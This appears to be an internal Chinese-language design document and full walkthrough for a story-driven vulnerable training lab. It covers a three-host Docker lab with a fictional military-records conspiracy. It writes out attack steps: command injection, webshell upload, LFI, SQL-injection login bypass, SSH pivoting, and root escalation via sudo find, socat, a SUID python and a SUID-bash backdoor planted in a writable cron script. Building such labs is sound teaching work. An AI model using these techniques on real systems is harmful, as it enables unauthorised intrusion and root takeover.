---
不進玩家發行版。內部開發參考文件 — 完整劇透 + 完整 exploit 步驟。
---

# BLACK ARCHIVE — 攻擊鏈設計與完整攻略

> 這份文件回答兩個問題：
> 1. **怎麼設計的** — 每個漏洞/線索為什麼在這裡、對應哪個敘事功能。
> 2. **怎麼打** — 從零開始、實際指令，一路打穿三台 host 拿到最終證據。
>
> 對照文件：`legacy-mechanics.md`（原始 VulnCastle 攻擊鏈凍結記錄）、
> `evidence-map.md`（每份證據的敘事功能與已修正的 bug）、
> `characters.md` / `timeline.md` / `truth-map.md`（人物與真相）、
> `player-knowledge-states.md`（玩家在每個階段應該知道什麼）。

---

## 0. 架構總覽

```
攻擊機 (Kali)
     │
     ▼
┌─── DMZ 172.20.1.0/24 ─────────────────────────────┐
│  frontier  172.20.1.10   host:8080(http) 8025(webmail) │
│  relay     172.20.1.12   host:2222(ssh)  dual-homed ───┼──┐
└─────────────────────────────────────────────────────┘  │
                                                           │
┌─── Internal 10.10.0.0/24（internal: true，不對外）───────┘
│  relay   10.10.0.12  (別名 relay.internal)                │
│  archive 10.10.0.15  (別名 cairn.internal，無任何 host port) │
└───────────────────────────────────────────────────────────┘
```

- 三台 host 各自是一個 container，內部用 supervisord 跑多個 process（原本 VulnCastle 是 7 台獨立 container）。
- `archive` 完全不映射 port 到宿主機，只能從 `relay` 所在的 internal network 抵達 — 必須真的建立 pivot。
- 部署指令：`./start.sh`，或手動 `docker build -t black-archive-base:latest ./lab/base/ && docker compose up -d --build`。
- 本文件裡的指令都是在「攻擊機跟受害機是同一台」或「用 docker host 的 LAN IP」兩種情境下都能用，把 `TARGET` 換成你打靶時實際用的 IP 即可（這次部署測試時是 `192.168.3.134` / `192.168.52.135`，視你的網卡而定）。

---

## 1. 設計原則回顧（為什麼會長這樣）

1. **漏洞機制原封不動沿用 VulnCastle**（command injection / XSS / upload / LFI / IDOR / SSRF / SQLi / SUID / sudo 誤設 / writable cron / Samba guest / Redis 無認證 / 憑證重用），只換敘事外皮。理由見 `BLACK_ARCHIVE_Modification_Plan.md` §19、`legacy-mechanics.md`。
2. **沒有 CTF 解謎感**：沒有 Base64/ROT/steganography/密碼謎語，所有「解謎」都是資安 enumeration 或劇情層面的交叉比對。
3. **資安 ≠ 唯一難度來源**：這一輪修正後，加入了三個純粹靠推理才能解開的節點（見第 3.3、4.4、5.4 節），不是打完漏洞就結束。
4. **不要 brute force 當主要 progression**：每一組要用到的密碼都有合法（非暴力破解）的發現管道，見附錄 B。
5. **Flag 不是 `FLAG{}`**：每個原本的 flag 節點都換成一份真的文件（memo / DB 列 / SMB 檔案 / admin panel 紀錄）。
6. **這不是一個「為了被駭而存在」的環境，是一個真環境，玩家只是恰好在調查它**：這一輪特別加強了訊噪比——搜尋索引從 3 筆加到 7 筆（另外 4 筆是普通對照組）、`/notes/` 從 3 個檔案加到 6 個、webmail 從 3 封信加到 11 封、`service_accounts` 加了 2 筆死線索、SMB 三個分享都各加了 1 份純填充文件。這些新增內容**全部跟劇情/漏洞無關**，目的是讓玩家自己分辨「這個值得看」跟「這只是辦公室的日常雜物」，而不是每個列出來的東西都注定是線索。下面每一節看到「純填充」「死線索」字樣的地方，都是刻意加入的噪音，不是漏改的殘留內容。

---

## 2. ACT I — FRONTIER（172.20.1.10, host:8080 / :8025）

### 設計意圖
玩家此時只知道 LONGSHORE 給的三個名字（`briefing/00_longshore_contact.html`，純文字備份在同資料夾 `.md`）。FRONTIER 要讓玩家從「這三筆資料看起來普通」走到「這系統本身有問題」，但**絕對不能**提到 ONI / SPARTAN-II / Halsey。

### 2.1 Recon
```bash
nmap -sC -sV -p- TARGET
# 預期：80/tcp http (nginx), 8025/tcp http (Python BaseHTTPServer, webmail)
```
逛 `http://TARGET:8080/`，導覽列有 Home / Dependent Status Index / Case File Intake / Network Diagnostics / Support Tickets。

### 2.2 用 LONGSHORE 給的名字做真正的 recon（不是裝飾用頁面）
```bash
curl "http://TARGET:8080/?page=search&q=Okafor"
curl "http://TARGET:8080/?page=search&q=Wren"
curl "http://TARGET:8080/?page=search&q=Farrow"
```
三筆都查得到，回傳真的案件卡（含案件卡圖片、`case_ref`）：
- Eli Okafor — Eridanus II — `OCPA-R4-11902` — Case Closed, Deceased (age 6)
- Talia Wren — Madrigal — `OCPA-R4-11944` — Case Closed, Deceased (age 6)
- Dominic Farrow — Skopje — `OCPA-R4-11887` — Case Closed, Deceased (age 6)

`$DEPENDENT_INDEX` 這個搜尋後端其實有 **7 筆**公開可查的紀錄，不只 LONGSHORE 給的這 3 筆：另外 4 筆（Priya Anand / Marcus Webb / Dana Song / Theo Alvarez）是刻意放進去的對照組——都是普通、平凡的案件，狀態各自是 Active / Active / Active / Closed-relocated，沒有任何異常欄位。玩家如果好奇多搜尋幾個名字，看到的應該是「大部分紀錄都很正常」，這樣 3 筆有問題的紀錄才顯得異常，而不是讓玩家覺得「這整個系統都是為了劇情設計的」。relay 的 MariaDB 裡還有 2 筆（Nadia Oyelaran / Kenji Park）**只存在 DB 裡，這個公開搜尋介面查不到**，屬於 Act II 才會看到的背景資料，見 3.3 節。

`?q=` 本身有 **reflected XSS**（`Results for: <query>` 沒做 escaping），可用來練習/示範，但不是主線必經之路。

### 2.3 三選一拿初始立足點（www-data）
- **Command Injection**：`?page=ping`，POST `host=127.0.0.1; id`
  ```bash
  curl -X POST "http://TARGET:8080/?page=ping" --data "host=127.0.0.1; id"
  ```
- **Unrestricted Upload**：`?page=upload`，上傳 `.php` webshell 到 `/var/www/html/portal/uploads/`（無型別檢查、無 rename）。
- **LFI / Path Traversal**：`?page=notes&file=../../../../etc/passwd` 可讀任意檔案，但拿不到 shell，只能讀檔。

### 2.4 Support Tickets — 建立懷疑 + 找到合法密碼來源
```bash
curl "http://TARGET:8080/?page=notes&file=welcome.txt"
curl "http://TARGET:8080/?page=notes&file=todo.txt"
```
`welcome.txt` 第一次出現「SPINDLE」這個退役系統代號；`todo.txt` 暗示有案件的 transfer reference 對不起來，但被當成「批次匯入的假影」揭過。

**關鍵一步**：`/notes/` 目錄本身有 autoindex 誤設（真實世界常見的 misconfig），可以列出導覽列沒連結的檔案：
```bash
curl "http://TARGET:8080/notes/"
curl "http://TARGET:8080/?page=notes&file=credential_rotation_status.txt"
```
`/notes/` 目錄實際列出 **6 個檔案**，多出來的 3 個（`parking_permit_renewal.txt`、`elevator_status.txt`、`supply_closet_note.txt`）是純填充內容，跟劇情/漏洞無關——刻意讓這個 autoindex 看起來像真的辦公室共用資料夾裡會有的雜物，不是「一列出來就知道哪個檔案是重點」。

`credential_rotation_status.txt` 這份文件是整條 credential-reuse 鏈的**唯一合法起點**：T.R. 在工單裡不小心貼上了一段舊的 provisioning script（`useradd`/`chpasswd`），內容就是 `sysadmin/admin123`、`devuser/devuser2024`、`backup/backup`、`deploy/deploy!` 四組帳密，並註明從未經過 first-login 輪替。頁面上如果順手看一下 `?page=notes&file=welcome.txt` 旁邊列的其他人員，會看到 T. Reyes 的頭像（`t_reyes.jpg`，真實照片素材）掛在留言旁邊——純粹增加真實感，不帶任何線索。

### 2.5 Webmail（8025）— 憑證重用的起點
```bash
curl http://TARGET:8025/debug          # 環境變數洩漏：duty.admin / MailP@ss2024
curl -X POST http://TARGET:8025/login --data "user=sysadmin&pass=admin123"   # 302 -> /inbox
```
webmail 的登入帳號 `sysadmin` 剛好也是 base image 的真實 OS 帳號 — 這是刻意設計的「密碼重用」示範，不是巧合。

登入後看 `/inbox`（**共 11 封信**，用同一個 session 直接 GET `/inbox` 也看得到，因為**沒有 session 驗證**，這本身也是一個漏洞）。11 封裡只有 **3 封跟劇情/漏洞有關**，剩下 8 封是刻意加的填充信件（合規訓練提醒、停水通知、電梯維修、印表機耗材、閒聊、patch window 通知、物料補貨、門禁卡停用）——玩家要自己從一堆無聊的辦公室信件裡認出哪三封重要，這是這輪特別加強的「訊噪比」設計，不是隨便塞信件湊數。

三封關鍵信（依收件時間混雜在其他 8 封中間，不會排在一起）：
1. "LEDGER Terminal Access" — 提到一個叫 `svc-relay` 的帳號，**這是死線索**（該帳號根本不存在），但正確指出目標是 `relay.internal`。
2. "LEDGER sandbox refresh" — `root / S3cretDB!2024`，跟後面 RELAY 的 DB root 密碼**互相驗證**（多來源交叉確認同一組密碼，強化玩家信心）。
3. "New Case Handler Onboarding" — 官方說法定調「這只是 SPINDLE 遺留的匯入假影」，跟 todo.txt 的說法一致，替後面的官方稽核回應（4.4 節）先埋一個伏筆。

### Act I 結論（玩家此時應該知道的）
三筆名字是真的、系統裡有個叫 SPINDLE 的退役系統、有個叫 LEDGER 的內部系統、拿到一組會員密碼 `sysadmin/admin123`。**還不知道**任何 ONI / SPARTAN-II 相關的事。

---

## 3. ACT II — RELAY（dmz: 172.20.1.12 / internal: 10.10.0.12, host:2222）

### 設計意圖
玩家第一次意識到「這不只是資料錯誤，是被刻意搬走的資料」。ONI Section III / Cmdr. Petrov 第一次出現。

### 3.1 憑證重用登入
```bash
ssh -p 2222 sysadmin@TARGET
# 密碼：admin123（跟 webmail 同一組）
```
relay 是 dual-homed：DMZ 側 `172.20.1.12`、Internal 側 `10.10.0.12`。SSH 進去之後，這台機器本身也在 172.20.1.0/24 上，如果你已經從 FRONTIER 拿到 shell，其實可以不透過 SSH，直接從 frontier 的 container 對 dmz 網段做內部掃描，直連 relay 的 `3000`（API）、`3306`（MariaDB）——因為 dmz 是普通 bridge network，同網段互通，這是刻意保留的「已經在內網就能少走一步」彈性，不是必經路徑。

### 3.2 LEDGER API（3000，只在 internal-facing，不對 host 開 port）
```bash
curl http://127.0.0.1:3000/                       # 列出全部 endpoint
curl http://127.0.0.1:3000/api/cases               # 列出全部案件（IDOR：無授權檢查）
curl http://127.0.0.1:3000/api/cases/1              # Eli Okafor — 帶 transfer_ref: SPINDLE-7-0119
curl http://127.0.0.1:3000/api/cases/5              # 不是案件，是系統帳號：ledger-cairn-sync
curl http://127.0.0.1:3000/api/health                # 洩漏 cairn.internal:445 / :6379
```
關鍵發現：`/api/cases/1~3` 都是「已結案死亡」卻帶有一個不該存在的 `transfer_ref`（`SPINDLE-7-01xx`）。`/api/cases/4`（Priya Anand）沒有 `transfer_ref` —— 這是刻意放的對照組，讓玩家自己比較出「不是每筆資料都異常」。

其他洞（示範/次要，非主線必經）：
- `/api/fetch?url=` — SSRF，可用來探測 internal 網段服務。
- `POST /api/diagnostics` `{"target":"a; id"}` — command injection。
- `/api/files?name=../../../../etc/passwd` — path traversal。

### 3.3 MariaDB — 真正的憑證與稽核矛盾來源
```bash
# 要用真正的網路連線（relay 的實際 IP），不要用 localhost/127.0.0.1 —
# 那會走 unix socket，root 會直接免密碼通過（另一個問題，見下方 debug note）。
# 這台 MariaDB client 版本預設會要求 TLS，遠端連線要加 --skip-ssl。
mariadb -h relay.internal -u root -p'S3cretDB!2024' --skip-ssl ledger
```
> **Debug note（已知但刻意不修的行為）**：如果你是直接在 relay 主機本地（例如已經 SSH 進去）用 `mariadb -u root -pS3cretDB!2024`（不加 `-h`），MariaDB 預設的 unix_socket 認證外掛會讓本地 `root` OS 使用者直接免密碼通過，密碼參數形同虛設。這是 Debian/Ubuntu MariaDB 套件的預設行為，不是這個環境刻意設計的漏洞，但如果你是從自己的攻擊機或其他 container 遠端連（真正的 pivot 情境），就一定要用密碼，行為才會跟上面一致。
```sql
SELECT * FROM service_accounts;
```
| service_name | username | password | host |
|---|---|---|---|
| CAIRN Fileshare | sysadmin | admin123 | cairn.internal |
| CAIRN Cache | (無) | (無) | cairn.internal:6379 |
| Gateway Maintenance SSH | backup | backup | relay.internal |
| Floor Print Server | printsvc | printsvc | printsvc.internal:9100（死線索，host 不回應） |
| Conference Room Booking | booking-svc | B00king2019 | roombook.internal:80（死線索，兩年前系統換掉了，只是沒人下架這筆） |
| Vending Machine Telemetry | vendtel | vendtel | vendtel.internal:8081（死線索，回報庫存用，跟劇情完全無關） |

`service_accounts` 現在共 **6 筆**，其中後兩筆是純填充的死線索——真實環境裡這種「早就沒用但沒人清理的舊帳號」很常見，故意留著讓玩家自己判斷哪些值得追。CAIRN Fileshare 這筆再次驗證「同一組密碼到處重複用」（Samba 跟 SSH/webmail 共用）。**這張表不再直接給出 CAIRN Records Terminal 的帳密**——那組憑證要靠下一步的環境探索才找得到，不是單純 `SELECT *` 就拿到下一關全部鑰匙。

```sql
SELECT * FROM dependent_case_index;   -- 背景資料，共 10 筆：Act I 公開搜尋能查到的 7 筆全部都在這裡，
                                       -- 加上 3 筆只存在 DB 裡的（Samuel Voight 帶異常模式；
                                       -- Nadia Oyelaran / Kenji Park 純填充，無 transfer_ref）
SELECT * FROM system_migration_log ORDER BY entry_date;
```

### 3.3b CAIRN Records Terminal 憑證 — 要在檔案系統裡找
relay API 的 `/api/cases/5` 已經提過有個叫 `ledger-cairn-sync` 的服務帳號負責 LEDGER↔CAIRN 同步。真正的憑證在 relay 本機的服務設定檔裡（拿到 shell 之後找）：
```bash
cat /etc/ledger/sync.conf
```
```
sync_target_host = cairn.internal
sync_target_service = records-terminal
sync_target_port = 8080
sync_user = administrator
sync_pass = Records!Access99
```
這是「environment relationship → 找 config 檔 → 才發現憑證」，比一次 SQL SELECT 更貼近真實 pentest 的 credential discovery 手感。

### 3.4 【推理節點】官方稽核 vs 你自己找到的證據
`system_migration_log` 第一筆（2540-08-02）是 Records Compliance Office 的正式結案回應：**「查過了，是批次匯入的假影，沒有異常」**。

問題是：你在 3.2 節已經親眼看過 `transfer_ref` 的模式，而且只出現在特定幾筆案件上，不是隨機雜訊。這裡遊戲**不告訴你官方是失職還是刻意淡化**——這是故意設計成矛盾、不給答案的節點，呼應作品核心要求「證據可以看似矛盾，玩家自己建立 hypothesis」。

### Act II 結論
玩家現在知道：這些孩子在系統裡被當成某種「candidate」處理、有個叫 CAIRN 的更高機密系統、ONI Section III 跟 Cmdr. Petrov 的名字第一次出現、官方紀錄跟你自己查到的東西對不上。**還不知道** SPARTAN-II 這個名稱、flash-clone 機制、Halsey 的角色。

### 3.5（附）RELAY 本機提權（非主線必經，但完整記錄）
```bash
sudo -l          # (ALL) NOPASSWD: /usr/bin/socat  -> sudo socat exec:'sh -i',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:1  或直接 sudo -u root socat ...
/usr/local/bin/python3-suid -c 'import os; os.setuid(0); os.system("/bin/bash")'   # SUID python3
```

---

## 4. ACT III — ARCHIVE（internal: 10.10.0.15 / cairn.internal，無任何 host port）

### 設計意圖
真相的核心層。SPARTAN-II 名稱、flash-clone、augmentation、Halsey 書信片段都在這裡。玩家必須自己從好幾份不同來源拼出全貌，沒有單一「THE_TRUTH.txt」。

### 4.1 Pivot 進入（從 relay 內部）
archive 沒有映射任何 port 到宿主機，只能：
```bash
# 從已經拿到的 relay shell 內部直接打，或
ssh -p 2222 sysadmin@TARGET -L 8080:cairn.internal:8080 -L 445:cairn.internal:445
```
（或用 relay 的 socat/SUID python3 建立自己的 SOCKS/轉發，這是保留給玩家自己選工具的部分，`ssh -L` 只是最簡單的示範。）

### 4.2 SMB（445，reuse `sysadmin/admin123`）
```bash
smbclient -L //cairn.internal/ -U sysadmin%admin123 -m NT1
# public / confidential / backups
```

**`public`**（guest 可讀寫，不需要密碼）：`welcome.txt`、`it_policy_reminder.txt`、`meeting_notes_disposition_q1.txt` 三份，全部場景真實感用，非關鍵——後兩份是純填充（IT 政策提醒、團隊內部隨手記的會議筆記），不含任何線索。

**`confidential`**（限定 `valid users = sysadmin`）：
```bash
smbclient //cairn.internal/confidential -U sysadmin%admin123 -m NT1 \
  -c "get acquisition_directive_excerpt.txt; get acquisition_directive_scan.pdf; get disposition_order_2547-014.pdf; get legacy_service_credentials.txt; get cairn_backup_key"
```
- `acquisition_directive_excerpt.txt` / `acquisition_directive_scan.pdf`（掃描版）— **SPARTAN-II 名稱正式出現**的地方：2517 年的徵召指令，說明動機是「殖民地叛亂風險」而不是為了打星盟。
- `disposition_order_2547-014.pdf` — Cmdr. Petrov 簽署的正式處置令掃描版，跟 admin panel record 101 的內容是同一份文件的兩種呈現（一份是 web app 內文字，一份是真正的簽署掃描件），互相印證。
- `legacy_service_credentials.txt` — 四組 base 帳密清單，第三次驗證同一批密碼。
- `cairn_backup_key` — 假的 RSA 私鑰，純 flavor，不需要用到。

**`backups`**（guest 可讀寫，操作失誤留下的東西）：
```bash
smbclient //cairn.internal/backups -U sysadmin%admin123 -m NT1 \
  -c "get casualty_log_partial.txt; get training_roster_fragment.txt; get old_budget_q3_2546.txt"
```
- `casualty_log_partial.txt` — 四個候選人的 augmentation 結果（死亡/殘障/現役），第一次把 Act I/II 的名字跟「augmentation」這個詞連起來。
- `training_roster_fragment.txt` — **只給訓練代號 + 殖民地 + 年齡，不給姓名**，見 4.4 節。
- `old_budget_q3_2546.txt` — 純填充，一份過季的預算摘要，跟劇情完全無關，放著只是因為「備份資料夾裡通常什麼都有」。

### 4.3 SQLi 進 CAIRN Records Terminal（8080）
```bash
curl -i -X POST http://cairn.internal:8080/login --data "username=administrator' -- &password=x"
# 302 -> /dashboard
```
（原理：`SELECT * FROM admins WHERE username='administrator' -- ' AND password='x'`，`--` 把密碼檢查註解掉。）

也可以不用 SQLi，直接用 3.3 節洩漏的 `administrator / Records!Access99` 正常登入——**兩條路都通**，SQLi 不是唯一解。

```bash
curl http://cairn.internal:8080/dashboard
# 列出 [101]~[106] 六份文件
```
| # | 標題 | 內容重點 |
|---|---|---|
| 101 | ONI Section III - Disposition Order 2547-014 | 解釋 LEDGER/CAIRN 為什麼分兩層；Cmdr. Petrov 的正式授權；**註明這個節點只是待轉移的 staging mirror**，不是現役最高機密資料中心（解釋了為什麼這台機器資安這麼糟） |
| 102 | Flash-Clone Substitution Protocol - Medical Annex | 掩蓋機制本身；Dr. Castel 自白「我簽了三份」 |
| 103 | Correspondence Fragment - C. Halsey to Section III, 2517 | 道德複雜性，不是反派台詞 |
| 104 | Internal Memo - CPO M. Kade to Records, 2540 | 訓練者的矛盾情感 + 追加的「07-B」線索（見 4.4） |
| 105 | Medical Certification Log Fragment | 解答 102 的「三份 vs 四筆案件」落差 |
| 106 | Cryogenic Recovery Transfer Authorization - Subject 07-B | Farrow 矛盾的第三個來源（見 4.5） |

101/102/104/105 這四份文件掛有真實人物照片（Cmdr. I. Petrov / Dr. M. Castel / CPO M. Kade / Dr. R. Achebe，`RECORD_PHOTOS` dict），103 跟 106 刻意不給照片——不是遺漏，是因為 103 是書信片段、106 是轉移授權書，這兩種文件類型本來就不會附照片，跟其他文件的照片一起看才會覺得「有些文件有照片、有些沒有」是正常的，而不是「系統只做了一半」。

### 4.4 【推理節點 1】三份 vs 四筆
102 說 Castel「簽了三份」死亡證明，但玩家在 Act II 已經看過**四筆**帶 `transfer_ref` 異常的案件（Okafor / Wren / Farrow / Voight）。這個落差不會自動被指出來——玩家要自己數。

答案在 105：
```
OCPA-R4-11902  Dr. M. Castel
OCPA-R4-11944  Dr. M. Castel
OCPA-R4-11887  Dr. M. Castel
OCPA-R4-10733  Dr. R. Achebe   <- 第四份是別人簽的
```
意義：涉入這件事的醫療人員不只 Castel 一個。

### 4.5 【推理節點 2】代號還原真名，兩份來源互相矛盾
104 的追加段落只用訓練代號「07-B」講一段親眼所見，暗示他其實死在強化手術中：
> "07-B. Skopje kid, angriest six-year-old I ever met... The official log on that one reads as a medical discharge. That is not what I watched happen... I did not write it up that way."

`training_roster_fragment.txt`：
```
07-A  Eridanus II  6
07-B  Skopje       6
07-C  Madrigal     6
07-D  Eridanus II  7
```
Skopje 只有一筆案例 → 07-B = Dominic Farrow（`OCPA-R4-11887`）。但 `casualty_log_partial.txt` 明明寫 Farrow 是「discharged, permanent disability」——跟 Kade 的說法直接矛盾。

### 4.5b 【推理節點 3】第三個來源，矛盾升級成真正的 forensic ambiguity
CAIRN record 106（Cryogenic Recovery Transfer Authorization - Subject 07-B）又給出第三種說法：他當時被判定「臨床上無法存活」，轉入低溫懸置，之後沒有追蹤紀錄。

三份來源現在是：
1. 官方 casualty log：殘障、除役。
2. Kade：親眼看到他死。
3. 醫療轉移授權：臨床無法存活、轉入懸置、後續不明。

**遊戲永遠不裁決哪個是真的，任何文件都不會給答案。** 這是刻意設計成「多份可信來源互相矛盾」的節點，玩家自己決定要信哪一個，或者接受它本來就沒有乾淨答案。

### 4.6 本機提權（writable cron，root）
```bash
ls -la /opt/healthcheck.sh        # -rwxrwxrwx root root
echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' >> /opt/healthcheck.sh
# 等 root 的 crontab（* * * * *）在 60 秒內跑一次
/tmp/rootbash -p
```

### 4.7 最終證據（root only）
```bash
cat /root/cairn_disposition_review.txt
```
檔名刻意取成跟其他 CAIRN 文件一致的風格（不叫 `final_*`）。**內容不重講整個陰謀**——acquisition、flash-clone、augmentation 結果玩家此時應該已經自己拼出來了。這份文件只回答一個之前沒人回答過的問題：**Petrov 當初為什麼決定保留這批資料而不銷毀**，以及他自己承認「沒有機制可以決定要不要公開」。是最後一塊拼圖，不是一張把全部劇情倒出來的答案卷。

---

## 附錄 A：三台 host 各自的提權路徑（完整列表）

| Host | 立足點 | 提權 |
|---|---|---|
| frontier | command injection / upload / LFI（www-data） | `sudo -l` → `(ALL) NOPASSWD: /usr/bin/find` → `sudo find . -exec /bin/sh \;`；或等 `/opt/backup.sh`（world-writable, root cron `*/5`）被執行 |
| relay | SSH 密碼重用（sysadmin） | SUID `/usr/local/bin/python3-suid`；或 `sudo -l` → `(ALL) NOPASSWD: /usr/bin/socat` |
| archive | SQLi / SMB（無需 shell 也能拿到大部分文件） | world-writable `/opt/healthcheck.sh`，root cron `* * * * *` |

## 附錄 B：每一組密碼的「合法發現管道」（不需要 brute force）

| 密碼 | 發現管道 |
|---|---|
| `sysadmin/admin123`（webmail + relay SSH + archive SMB） | frontier `/notes/` 目錄列出的 `credential_rotation_status.txt` |
| `root/S3cretDB!2024`（relay MariaDB） | frontier webmail inbox 第二封信；relay `service_accounts` 沒有這筆但 MariaDB 連線本身就是憑證來源 |
| `duty.admin/MailP@ss2024`（webmail） | frontier webmail `/debug` 環境變數洩漏 |
| CAIRN Fileshare 帳密 | relay MariaDB `service_accounts` 表（密碼重用印證） |
| CAIRN Records Terminal 帳密 | relay 檔案系統 `/etc/ledger/sync.conf`（呼應 API record id 5） |
| CAIRN Records Terminal 的替代路徑 | SQL injection（不需要密碼） |

## 附錄 C：完整時間軸 / 真相

遊戲現在時間點：**2555 年**。見 `timeline.md`、`truth-map.md`。簡述：2517 年 ONI Section III 因殖民地叛亂風險發起 SPARTAN-II 計畫（候選人徵召時約 6 歲）→ 用 flash-clone 掩蓋兒童失蹤 → Reach 訓練 + 2525 年 augmentation（死傷不一，Farrow 的結局有三份互相矛盾的來源，永遠不解答）→ 2552 年星盟戰爭結束後這批人成為公開英雄，起源持續保密 → 2547 年舊系統 SPINDLE 退役，資料分流進 LEDGER（一般）與待轉移的 CAIRN staging mirror（機密），正式授權「保留但不公開」→ LONGSHORE（Naomi Okafor）在這次 migration 中意外發現異常，花約 8 年查證後於 2555 年聯絡玩家。
